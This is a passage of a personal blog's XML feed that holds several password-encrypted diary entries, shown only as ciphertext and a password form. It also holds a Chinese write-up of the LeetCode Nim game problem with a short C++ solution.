    <url>/2020/12/02/2020-11-29/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="36a44a5aa4fcf7360de4716a010bd5f751a2c39e8a150afa4c27b39716adaef6">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e00bb9c897fe46afefff0442392bb8eae38f2b1826776b7995b1dc839c51861072da0c949898347e1e5566b5db269d63692df744fe9563b4a0e2a290f0bcca5271554ffd3934d6f82c5de94c0ce8ac923f9b630d8cf12a95c7cac01dbf572835f21e8fc127df199727ba485632bea81fdcc5f4945aa743c181c5280b365a484da58c93b6fe01bd257704c302ee4c9bd09d7f0d429d8dd480a6710ff4d23b6316348176a316e9331b6afc74fc322aeb1dcd66cca3391994fd67b64841451354db91e0ce7365b693d923fafc8b0a178a939f262d5c0e24bac7b2a1c45bb36e800e8bc70d4487fba17b22f34452c8a56fb06607b9f41f2e65a7581ea2ccff48e3e2f0aca8f1f8533e54adb2a23c5991a0d2c1ea33281cee28f5d581cadc4b131878c3f987eb5c21f932f1984857ec420e2df9da85c6b688874db9656ffe3abcd5d4cf6be1c6034a3b093c1d6e7f7079115bd4f6d5476552500ee7bcf7fb075ca971bca134046ced8080b44decc34dc74f38bcb122e89003437aefbda0fc28b30aadaeb145822d6a81be004a4a9dc46890d818b355c82ff01ebf429650242e2a888493992bd2fd2b55727ef7afeac5902fdfe76c356b487533887f60120cf123178345af9c4f5d529dac20689d29bebd2bc2bc7832821fda8d9f781832836e55c6b3b9502a8adcb694fb3ef15b47c07e471749c5784a84d16edf9cb79772528e9e17237532eee794585199ca5274f6f2e301599f2193373cb9c87789f9e60eb4ebbf3bdf354f195709568448ab924ce03a7d00bd2e056721c123bd26849dc5145b9463e7b81908adb47be05bd0206cc02c0ba878f0b96d22553ab1aae101f3f2f777b082cea6ebd3b01773785c97875aef1c005b592f2f5c6adde750d2b2b3980c1eb90739c22c5841d36173a094c9743c0427acc136f2f47c206e30ef1fa41edf55d7a0ddf7ed04b60826ee681261ce72917a20c1b2bb35702ff84581e30ef1cfa07093d43191d55401138d091853404abf8caa58960a00fdcfd0633845c0f64e5c9d4d2294816daadca78985e7e0713f41f3d6fd8f991c87f15807918a7485736c3154af71e769e0b11c36924cd977e1eecaddb40bf2e9163713755e7c98424edf2e8e310d1a29723558aba4f8b1ea5eded0f0477c4672d9b0849b56a002d341ce04adae3c4bf45872a49f6ba9260fee66341d852578c3ac8843dafb6bfc1481f297a47e6cb2fb1ef0310b5b7d8cdbd99e0370245ee9cd9e15e8343e887e6276a72afe8a57dccf0374e3fdc93abcdecc418e20fd80017560925879f8380d771d4004ac7f2aa839518ec3ff1acef46d8bd9732a060da7476f127bf8b795666b9e3393ff8440cc216fc5c1fa91ae5d37de8a76891bcd71f9c2e4d4655ab49f1c8000ccf48b252671469910b5d6a4800845b1dd8f862bc3b02d15a9bcc19a8bf98fb648c65282eeca0e5e0b9a7d1cd46590b47b0044a22b1c342ab2109172c111d54e01c75832063bc7dbddfd27eb3c141346f7e6267d9a84cccbb16d76a54d2bab5d981031194f9e832b034d4694386b050c585f7e38d08071d8b7a591409bb7d663992098260b8893941113ddb47129848b6e922f9f7188f499bef0d8fb99defab1fa17238bcc04fd4f181bd452d75f2b61a042b748d6966dc7cfa30584816428803d8c93a5bb650402ceeb3771abb21bf09c92f9d55c3a9b073c5daf54070f9ebb5490e893c95bfba791fc50fc5b5a6a0d452179517e7bb1ec6efff032ab30726976bc212b541712890d4e45c68a6c6ec3211df0a42389e81d175d76ca6db1d357ddbed2bb3219ee46197a1f1a378d608003d74b3f99cd8e21e775891f20a70cbc4b75c743fb5d859e3001c49a41cc707c2bc7dc44d4a9a11349e38874581cf8325e875d679de4d8ffbfe27714ed55024f7973bff650e54a0a9eada98bfd94a33c9d13779de0b628eb89368399a66262fd86531466510fee4cdf41b50fbffcfdbb8fcab085043544e1e3fc272636d423e93f9adaf896f11626ae8c4e602a3297febe60422b182a2cf6f67026f2e75d60d5552b7b58c030c159b3ccc8a0903c76eb0fbbb043c17a37b92b0170a24e4458a141ebfc2b7c582b3efd282832adf5c479e285db4ae2f5bc677dac17c8f6be31a114ed59cf6830d0b89bb6556fba4226643b869315d1b0b318c61ab30efdb1ebbfc4a30bcafa6e56a18f956490d7d9b95b35de265afa882f2a93317dcc5e522dc64a8e8a9ba3998fd89cea952bfda1bb97de6dd2b0cfda09ec17c0220bda4f0b6c31c8dd3a342c854da56669805e1d8cd4882a2ed61e5abf4e98d3f0d3efc916459cac9e63a9244860bb8e2423de8781f781d6343ed50132b69ffc9c59259fda22c1a50ee2ea4454f76bd033f552066abb78343b84ccddbac44b22e77d592583dcb68b0b75e8d8085be959277d52599442148bc4331f57302ef33e0684f3837fa8af495497e1f837374ce8c46add6f03ad1c8c822fe0a56b606175d6274165867ef0a6ccd32701861361501418bd95ec4b0dae78e5204bf127bca9aa1b2d35708a60bc096428bc9a71a3345dc3f2d05ecc799524d939a1dc09a453410d59ca874e8ac40bffba0756e0fe571fd024c440d7be3fe4a567039ee3072ef2f89172b5a3de955e23b707a167b1d678b5f68fd4edc984c188fac93dbfc74a04c3ff1826083475d02897111280854990756fa6be07a0e0e3e1eec504466044bf1be9916b89efa5755d63d7ea6369dcb62b7b1eac6e42d230e0bb69ec699e21f26d2903c2e19c11f716a65279b0c4c8f82a086c7835a8fa8a340117ab733e32da033ab9c021e8f80eeae3d6c784c621a2ae2ba2eccb393f2b7b8f1a666a8f754faadc6d8c161c5a5dea345cee10b6c98515c13d4d8424c78335aa55b9452da5a309f7dc12dd3dd0ba6d6e9bb2f4898defb831a1771cbac269d2b595c95af1a5acb64183e22e44d73f0d7b12c78bccc5d39ed4026e9ce44bab6cc8a056995bf04656151bab1bd3774300e06ac2ed5c74fffb3b4a268c814f2315f538c9d3d8a3f06edd5a19ef6d50f715345ae985a1ae7b5bb862981e2103256c18f21ec7dddc06fc880e922f08d150c1927a1dfdb8a039edce3e1055fccc03bc57242c8a7bd1a022d5ad787ed0b690ed39ea48589df5ac0bd62db20147f0af506d8a4fe4590d81da800e7f1fa3c91a2b5495d4044f7c8743e731dcbc650f0623300dafe3ac90c5392c7f0b150805a632ade973b7bdb7313cd39813a001869d82b3f1c0c383380dd693d6e0f23f7c1015ad45c043ba66fa043ee659767f16c6444b9e98fb1c431dc93b9aa88e31def1ed2b181f0ca53620a241a72f83c69bc129836df95398bfca953022e959c6cd91334f6ff0e0f8ddfc33d75e05af886430da66eb6e4d7907dcf6ed8b0fb146ec1cbbfc8fbb503055248fb0306ea8bf1fc6b097a6fe0c32a292c4341527eecfddf05d33e2c71362316bf4760fc4ff3b1baae97d1d0e1da84945f15138914c8b3d8cae41fe23bba5d69374260f9ed3af8139509c5927f8dc6f9bba31b5b6aa0a0d06e3d0c4daa3fbe94975e078fc24d27616ee82e510d4df038c998a847d503a63e83c74bc47bfe21f85feb1a70cc52278a8c023b098f3a988fca8c56ba72a566</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>Achievement provides the only real pleasure in life!</title>
    <url>/2020/12/11/2020-12-11/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="d68786d8188eb865b8e7522e0b88b1a3efcd99843b88a647b440d8cee839882e">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e00888ee704cf8119979082dfbfb20983d6ca9cb4aceed86435c10193387230b44f4ebb02b5fe1d7c3f7e75da754e1c3516a80be24c73c1e3f8e2f82e2941d66f9d63dabed66672299bfb61f664ae83ac4d0b315b6a9eb7bba4b7c239665504f4a934adb876b03c92b6caecd26753629e2774a52ea70b6cffea8f79fd5b8c8d4a93ed0e0597422e498fe241e391e49c1e1abf49b90b461ce4ca422c760463c3f59e62d8d186fac4501ba3e5726a5308a475071769366e05cc5ca2647cff8c9b4fcbe1285f81f3ce55d0d43081464be601186e1c9be9956fba0262d2e68b420e476403cc620a05eb299c43395124f02eb7f23f4b7b215f7d2ae2b7c01f3968c0233f2bd7886ab468108dfc6cc4c1c0396254d15bb0e7fb0a5506911dbe8803858de88a50c8723f1724340aa6c646f64fed97e9bd70e40b2165c362c69c6a2f406bee1263e8d390f02e3d8e154388eab4e2153f88dfc3ba9391d0ac13485f9fa42f61998f9cee3fb1374064107aac2494b9ca2fdde39173f2e5d155403291ceb013a59126a97d6e30b32243eb1b80ec5b1d5fb0df7724419eb50c37ae25aa6a8a4d1a2e81f4808237a3c7acb0c11444ed5a46df4710750cf4eff36c8cdd84a375eeb54f8ef006565d0ab747998353162b41ea6f7857ec95d18e316b8302ab1ad38a8ee5527d393a769ed8e9747d73efbe8f620e55eec9bfd087e2a132f29289d7fe7e0494ac0a05e02e8b5fe7a11c8cfe9b47f66751d7710b1bdbd1fe8fc3bd6312a7ae7cd71b02c60b2914a8fb1df27bfc365a4cd934ae102396c15f06be1e812454dc498877ed8bc1e979f756eba8389f2aabaf2c0896d27612d90ea05633967dfa7a3b07d055918b2ec3c5216f33e3c0cfbb3df141188153b5d22aeab0267b0ceec027544c0e358791fd5470352ef3f33335f47f7fc27ab3953ce86f0fd745f7325287ff08bd7356b45616b184cdf933dd6e6188d40a85053b7f3d784ba65b5eb14dec0bb894ef10155c15b13adedb264c618ba995fbc60092481ee4ed858e9bc2b025fc4ca472dc3b672eddfadcc9e20af7c369f15a5e83185e4b917b18691028b766431200a5adb9dd01044e39792561d5cb622240c4d7720c1e9c92131b7c459921169335d3fbd90c6e3d3f4d904566a8fde0c75eab7f0036ab8334b58aae771b8c19b756a75db120d787964d306580c250e8d5b8d9660bfe027d9dc0295e6eac71a93f8e0de200a206974550feb48c81e745022ab94b03d55d4f8abfc89e5cfc9e664b41300420185c18c683caee478943f214f19b97bf679f107732cf705c7c2659a65511cb40745ca447c2417cebb414390a991545ae7b7d16b3b2ac42d12560772f036a8ea61b0bd2daefce3119a60e49c77684b01496670e3e093c2dbadb61cea5be32e957f14e6452986ed6b344b26b724f891dd428d6666a908696b1f09685aeb3199eaac74a92b7eb5f950958e7ec2b50491f8339f804afec466297151185c460434ec1d6f632aec9b944973499e57edce4b9cea0c37b3a712dae811d1a5d7a1a273801da17cb5709d7d6966645d0788fa2954c679ff1efece59f8f3e8b371f7f4037c881c235ad65da3c8159a362a269d719cc6b5c65397ac6a1895c6465701e40e0ffccebdca185174f1a6c843553d5e3a63fe51e37f713bef46d0b36fa4930d450d765d5ca1dcfb7bee6d2139b3e3f5fbd312016ef7f62ae66c6988fce2b426def6cdf1c0177ee21a4253c8448229c2108db38cba08daf112c9bc45874c113b5983783448a8af5c889f9a4c6b655b0201c52e166f4e8e8ad26c28d8128d55fdf068171d76ebee1849d682e48d64500e5d9063af4883cb914a218e380df028812b61b5c09c44efac0fa699974cc6f7a26ec5103d9b3cb461cbdda8c3275602d1bc00f1566893e92135a023a852e6a84770cfd9da4b94515ad0891e01fa2e1fdcde6c576c86e9a9118d5bf2e9555124b06b6155e9b0119d26003aab86b62dddf092c60653eed2de95d13f9f78749bbbae7c7686153ea2b396ca7696049000dbba2279c4d68cda2347c1eea7e70052db6d6054f473a62404ad3424e3e41f63ff0f2b17a8d3dfe98b00b28c39c5bf8b9101546c057758b9d4b855aceb1b2206bd57eb14c61350fe8c39dfe3c88ef77e75414b6af754166205e22bfbd933f69c0d98424141eb94975b9b5714f4e11f571010064ccbfff9450e275c3d13b30007d3360d6770c45d475cf16ba5e8937ab508c53178f8be9c54f1fcc07a9aea98bfc59d77b5920ffde739c51c8e6281470b8122a205a7f1109bc8a451c9c028fcca35600eca9eac73b79a57d3237474af9b416c20b0e9130a32bb25a2766efec4b8ef12bbcd0053b4710eda270b78c518864331d7979558402b2bf7ffdb1f1ca0eaabe0751b304f4d265a25145bb4ba34c49f11c9223620555953ff9440397de839519613aec2faeb1c7027120156040aaebcc6efac6735c7632f65b00e697dcc7e2b6225ea4f45d66ee5e3312de</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>Victory won&#39;t come to me unless I go to it！</title>
    <url>/2020/12/18/2020-12-18/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e87ad4489f23fc2994b3e1eaa831904ba289a20629a6d37328ec62b87c10aa6c">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e003936201b2d4cda497799659c6d67810605333475f74a7a5b91d0cd971c22b02db4353eba444ef4b91b1e665195944c995a1cc1ba4f4861e396616a32173e5c69a6ab7023d3c58545776ee9280226cf6de6a5317d6116c8d7eba5be4345274bcff84fd57df579a4165ab8e65a22b30014226fb9ff95ec4d796daeadcaa5397917e308848668cd5c25627de0cae643663caef30234f1b0318a0b979e0c11e1932efcdf891b5b2f9bd7d4d77cf93a4736b959b303b4a5446f957006dc63f1b97a83fa30580d5874cbacc0674fbfaa2dc40c21f02319b11022a618569f94ecabbd9bb610254fc84d39d2df2def9e8d3a2d2e5099dcd287b5588e3983fe5d1fd77d7d05be3351d093c3030e1795d9bbc0c01106dc7e753ed0718f2cbab73a3b053e215a8cab3c58714ed376b63e53dd26aede04c58aca37efb7e301c2e87f1b3e56d0ce3df6a4000057eef661b2bf526ce91d7723447af8466038fe737bfb753a6614ff45c8e990d5c005e067cbf4eaedb49a0fbcdc7c8cb4c0798d30678a5c011010c7a1919726e09c810b42aa53f9ba9ec33c37f973b0d7cd9e286f8a2018933ca131d9bde69a5970b5247a858fcac8e19d6f8d4625a465b9119fe93617294f58db2e03cba01bd2b519d3aa55d81c5d2f91f4909491db51c608058ae375cc2ef6fb3da856e8c9bab32fecf1e6721b639504b94c9ea678b3bb977097db5a1e0525040c3902bd71ffbec09af1699fd79d2b264c53f6f837f59586dcee29682d306f33944a1e002252be4891d176f1adee456f0570594d9588005cd90d6c681e3643e1432a80759a59791784724cfa49b7db93db61280457aa398e2b5860a2d7a8529ec7c7559a1d6b3af63fb34e94faaeb4a94ab849ae28cffd5a66e2fd6caddd36a9824cf720b48c40c544c5329c8eea7366b3e20a561167e69a82ddee27f5e894f76cff80c1676c2d31a11409d0d10fd9fd4fe86050d7c3d9b9786fa7f4388d67ab1f73447e344e860e94bf9d0b4812ce79012ca095caa0fb0c282009e51868b159481c3b3d4ee56b5ee17c2613a3a357302fb3b5be41ac2cb134e3c9f377c2949f7f53127887dd974be24a00377ab806fb4d2d5ae4232fa25ea93cd39456d482e2b4f4bff3eef60f4ea87d037f9be9aadf1b3812486e94338093987a9e00230cb54f3367735089cb3f2c87032e8ef62f3a6f3a14bb8cfbac0e9c0324fd348506aaa60f6847d67bdf94d90c4bab4eb28e2e07034451abf64ae59ed491df4a71f04ca430ae156d9366707b3f2f78c7854ab7397fa990f12118aecec6033fa51025dc7db5f585895d5bb9e1b552867e56b069d450b45a3b812a1f17083d390b479a2af9b54ae6341f2a1eb921733007c3ad75c20b52c2f3e0b38625e0905842bdbe158eb3021550cd28ed54d6ce99f0299fc5768b60aac66fc67e67f26f8ced8ea525e0f079fb7ff996fa686d66f20a1819323f555a8343347f51aa7e9cb40fd4475d5052f6529a9c998f30b017b384a0ae9e0b2d2cdd1bed36ff5e932a2465ef79ec89abef2453b394383a0cecddbd79d66b12b5e91551841306dbb61986a47165707f94817270c708cca994cdbd5cb9a4abe34cddd3d3979c005112f8fb168e9eacc5db6ce25d7c1b807733e05e437239ad10ec2ed625ecc3d021692725d8b8463416ecbf5c4376d2a385742a5c978d2b59cc883c93f7befeef659c4bf84dde6bb2b380a642fe744c336edb2adfa8374516db3538fed3e0ba01c0874dba722350d672ce38df772b8d9cb76d93d428d15ffb71e95423ac2fbaa8aac8a2f3c9dd79d35857208d2d971d92c73a5787ca99ae8ee18b2c8af41b692639fbc83776b9e623d697f3161f5289842c3d72a4a8c251024844c12e43e08cd29f5639f2b68301238abf77c252ad5bd055aeb88952b327761d1e87bdf99730670291a4c95506db8e19b13d6c27bd9843974fabe34920f0779df7acedda6dedb58bcdd5cc5053bb1a9deb4ec42239d3eaf36862ec2733f4e0d5c452709bd8978af55573c25cda56c7f685335a378d41a128061118cedce79c618d01b0840cf9f934f8fec1077533de9dbe29ace0184353949b0240fe2366e2d7fa940ee9db461bb4ad6018794ac3de08bd7302e1c2c3d888ca924eb0c76c557c5a25e35bc708aacdfb447ce7108abbd75b168b9192e2cbb2d7f9be48ce38e2ced8c40e8641e7c81fb9f263aa832d8b2816428a9f0ac80844be0ca89c24d809ab7dcf7cedca64c78afcb660886065a205d2de80c12918f73de1d68e4b294afbffe70a6e9fc47a2d31f145bb5ca50e72d8d76aba0d6f12926e0e8f1a4a3f095fb0f52cb2d984a628d90ea4c593259d692c55800182fdc9ed2f2cb175e3e463c1abbea19ddc6228fcf5097c339b5afee582fce0b08b0b1a31b9e36c3f18dc45a435583da235dca6d006f9ff3d791146104c20ba49416afbfdfa4d7cda2a619e78ae7f329faa9e8c5bd8145aef843f2d1f8a16daf3c6c42b0651c4e68a69464edaa9f5188a311e85a44700927dd2c7f0ff34dc7078c20158741f11de56a041c294d1b03c63c975af9bd452f0a75e7bf3817bf150ba731c91ff8e18c74f150cb43563c1d770d4aaacd3491213353616d05d5a6c73774af32294a4ac59a7261d56286cb44e783a9f3619959a5acc48dd524fa3209fc10b9d08ef8ac875797fc59de5965df9ca7987b7d2df0c9b8ef145419da06793068f34fc7971334462f6c71d72978298faf81620ccf20eb44533128e6867652f3f746af3e663b751a2ca1ef541f58bc303bfdc369827b29f38684b72ea00d33724773fae2b7f75cf471a46dcb79bf9935e6a1f2e4ea980f315bccc7de728709984efd9aad9c3117243efd4035513267ad98f806b0f040867436feb4f2231a5557d2db192eb204fcbf496696a234cbac485c7a895128557e4547dc0c04f61ca748497f36f267c7e8ff6750f0126f513514fbf33ef537dfa77c0a93fe9ee6cec0f132377adb1501ba2cbdba12281c44c96929708a647833356ec4eb27406ac06130ec6e94d1ad71b2ba9e61efecc80289fc895c0bf77fb64509db8d7d0c1d1d568e13ab4901bf1817d92fdc2e97ae7d841af95530703476230b3cdd49b5e1f8b76ebd84dde2f9cd81cb26fa68334775fc62019216ff6b62f31a50ec2ed2424ff582b4ed72ea9d3afef755bdb37e94813121c2746d133fd82fd16da17648317e3c46573d7536172c2f2b617fef02c0fc82e101a1a1e6b19e377a769957a60e906b2a65f660e55785468ec252e8c70afece546354e8b0dfdf6bf9e62896b856ef42d26cb31084d549f5541561bff1c2b11dfbcc717f30dc8378badbf733bc4c30d618149918f9010915a28a5082186ca8179df0bad2b1294b7aa093000695c1db270785b049efbf07b86bbb6c02ce5</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>Try your best when you are young.Never regret！</title>
    <url>/2020/12/21/2020-12-21/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="35495aea752458970a0c4ee2d06ceddd0d1e579ee886d8c15644e2f0b55457f3">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e000b0a8dca7e376125a4cdb3cbae1e82be1b8ffe4b1ddee8166abe4d17ca255e92e25155855cb800f617978bc03ff4a80227f2eea81c9e6800669497894b0947608a015af224479f0b76cc7255a440575f6f901b8736b1f32a50ff903450f7c85b03113fa7fca15486e274352a025f7af6b47a60f3fd35ac7b5216de2f1e20cb83cf2d8ad4a1a2ff69de36e3fce2236af55b9bba4dc2dafc7c775b491f809dce6863a40c8ecd1d585494d8d3569b421923c186f1ff53953336601c5680fb95e39f762dbed49eb8a68a67a73a22e6fa018c0c847ba06db6e76dac488e25c6208e2dffa55d875ccbfc17f082aa6e7217cebe1c94a112232a408287f01fd8297f82242f35cb0ee83e5e0cf781bc92f2ecf270d5668ccf9c9d21004ada536db8fc8739a43575e97a7bab952dac01a074a0a96adcd0f0a3d489756b8d5a900811846277f400cbc0875465d372d902b4b6ddd461738b7a5f5eebe436f4a9849cc730758f3462fb531b26b2cf00bcec286a093784ac300615c302870cd09440f146b8e1156019f3dcde1a02bfa59ef299404f40cef7ea5ed83dbf673f2363e2f7c7ed86d2875170cf5d49f1c1da29701598deeb0d2d82c7fd142e3ef616c485610a97d205f327971747e957b42d520c544dbe821bc9bbd3f6d062dff6e9b7961759ea0335af4fa384e98b981573be92393cd0704c9639336fa837d3c758152ca37cc8e8801913ef0891d54ed5e17294399320c729fe9ff4c120ae6ccaee3050ccd06d1ec086f1e205a813e8b91df303f25877ad1bcf71152b977efa564e95eeb10f40cb37c5af9bab25add1c48a0836da72f087a3ef895ada6168d8b2e8fec19f9e22533c700e3ba9ef56e856bd2d2ddc9130cd5e6677cbeadafda738eddfa44fab47c44028010edc8b57d6a1bdede8a8caaf071b2a9ba82147468e9c5a373fbde11509bee838512201b4379591097faa4f58711ed4146c11fa55987da37b6ce644b887accaa2e32f8d0028c43a2634adc7dd3867a2da467e0920d3b1aef1bfbc5952c4ceedc7e1c7f90d0324446087648e5838a177d3a71c5342dddf980f723157de37457c12723a73366047eab131c2395f55765c531fe71d66df1fbcb1609825231fcb597ad309e15ea71cebaef9e4247134fc91e8aa2af08072666cd9d202949ec8393f7cb08611a569d444950ad11d9a7b3a5752afbee3771f1e78831002d0e9fe521c8f58e906098a3c2944613b3f24d618</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>Nim游戏</title>
    <url>/2020/12/02/Nim%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/nim-game/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>你和你的朋友，两个人一起玩 <a href="https://baike.baidu.com/item/Nim%E6%B8%B8%E6%88%8F/6737105">Nim 游戏</a>：</p>
<ul>
<li>桌子上有一堆石头。</li>
<li>你们轮流进行自己的回合，你作为先手。</li>
<li>每一回合，轮到的人拿掉 1 - 3 块石头。</li>
<li>拿掉最后一块石头的人就是获胜者。</li>
</ul>
<p>假设你们每一步都是最优解。请编写一个函数，来判断你是否可以在给定石头数量为 <code>n</code> 的情况下赢得游戏。如果可以赢，返回 <code>true</code>；否则，返回 <code>false</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4</span><br><span class="line">输出：false </span><br><span class="line">解释：如果堆中有 4 块石头，那么你永远不会赢得比赛；</span><br><span class="line">     因为无论你拿走 1 块、2 块 还是 3 块石头，最后一块石头总是会被你的朋友拿走。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 231 - 1</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目看起来有点东西，其实分析起来很简单：</p>
<p>甲乙玩游戏，甲先手，石头数量为n，每一回合拿1-3块</p>
<ol>
<li>n为1、2、3时，先手（甲）胜</li>
<li>n为4时，甲无论拿1块、2块、3块都是后手（乙）胜</li>
<li>n为5、6、7时，甲总可以拿后剩下4块，这样到乙的回合，可以看成是情况2，甲为后手甲胜。</li>
<li>n为8时，甲拿完后可以看成情况3，对乙来说，乙为先手乙胜。</li>
<li>……</li>
</ol>
<p>总结可以得出n为4的倍数时后手（乙）胜，其他情况先手（甲）胜。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败12.24%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canWinNim</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n%<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

